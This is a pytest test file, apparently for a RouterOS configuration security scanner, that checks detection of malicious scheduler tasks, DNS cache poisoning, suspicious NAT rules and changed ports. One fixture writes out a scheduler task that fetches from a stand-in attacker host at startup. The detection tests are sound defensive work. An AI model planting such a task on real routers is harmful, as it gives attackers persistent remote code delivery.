# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

import pathlib

import pytest

import offline
from main import print_txt_results

FIXTURES = pathlib.Path(__file__).parent / 'fixtures'
EXPORT_FILE = FIXTURES / 'routeros_export.txt'
DNS_CACHE_FILE = FIXTURES / 'dns_cache.txt'

ALL_COMMANDS = ['Version', 'Scheduler', 'Files', 'FW Nat', 'Proxy', 'Socks', 'DNS Cache', 'Users', 'Ports', 'FW Rules']


@pytest.fixture
def full_results():
    return offline.run_offline(str(EXPORT_FILE), str(DNS_CACHE_FILE))


def test_structure_matches_live_scan(full_results):
    assert list(full_results.keys()) == ALL_COMMANDS
    for name, result in full_results.items():
        for key in ('raw_data', 'suspicious', 'recommendation'):
            assert key in result, f'{name} is missing "{key}"'


def test_version_parsed_from_header(full_results):
    assert full_results['Version']['raw_data'] == '6.49.7'
    assert 'skipped' not in full_results['Version']


def test_scheduler_detects_malicious_task(full_results):
    suspicious = full_results['Scheduler']['suspicious']
    assert len(suspicious) == 1
    assert 'u7' in suspicious[0]
    assert '/tool fetch' in suspicious[0]


def test_nat_detects_public_to_public_dstnat(full_results):
    suspicious = full_results['FW Nat']['suspicious']
    assert len(suspicious) == 1
    assert '8.8.8.8' in suspicious[0]
    assert '9.9.9.9' in suspicious[0]


def test_dns_cache_detects_long_ttl_and_remote_requests(full_results):
    dns = full_results['DNS Cache']
    assert len(dns['raw_data']) == 3
    assert len(dns['suspicious']) == 1
    assert 'poisoned.example.com' in dns['suspicious'][0]
    assert any('disable it' in rec for rec in dns['recommendation'])


def test_users_recommendations(full_results):
    recommendations = full_results['Users']['recommendation']
    assert any('admin' in rec for rec in recommendations)
    assert any('auditor' not in rec for rec in recommendations)


def test_ports_detects_changed_default_ports(full_results):
    suspicious = full_results['Ports']['suspicious']
    assert any('www' in item and '8080' in item for item in suspicious)
    assert any('ssh' in item and '2222' in item for item in suspicious)
    # ssh is not on the default port, so no recommendation is expected
    assert full_results['Ports']['recommendation'] == []


def test_ssh_only_commands_are_marked_skipped(full_results):
    for name in ('Files', 'Proxy', 'Socks', 'FW Rules'):
        assert full_results[name]['skipped']
        assert full_results[name]['raw_data'] == []


def test_missing_sections_partial_success(tmp_path):
    partial_export = (
        '# nov/15/2026 09:30:00 by RouterOS 6.49.7\n'
        '/system scheduler\n'
        'add interval=1d name=u9 on-event="/tool fetch url=http://evil.example/x" start-time=startup\n'
    )
    export_file = tmp_path / 'partial_export.txt'
    export_file.write_text(partial_export)

    results = offline.run_offline(str(export_file))

    # Present sections are still analyzed (partial success)
    assert 'u9' in results['Scheduler']['suspicious'][0]
    assert results['Version']['raw_data'] == '6.49.7'

    # Missing sections are marked as skipped
    for name in ('FW Nat', 'Users', 'Ports'):
        assert results[name]['skipped']
        assert results[name]['suspicious'] == []
        assert results[name]['recommendation'] == []
    assert 'not provided' in results['DNS Cache']['skipped']


def test_missing_version_is_skipped(tmp_path):
    export_file = tmp_path / 'no_version.txt'
    export_file.write_text('/user\nadd group=full name=admin\n')

    results = offline.run_offline(str(export_file))

    assert results['Version']['skipped']
    assert results['Users']['recommendation']


def test_missing_dns_cache_file_is_skipped(tmp_path):
    results = offline.run_offline(str(EXPORT_FILE), str(tmp_path / 'does_not_exist.txt'))
    assert 'not found' in results['DNS Cache']['skipped']


def test_print_txt_results_handles_skipped(full_results, capsys):
    print_txt_results(full_results, concise=False)
    out = capsys.readouterr().out
    assert 'skipped' in out
    print_txt_results(full_results, concise=True)
    out = capsys.readouterr().out
    assert 'skipped' in out
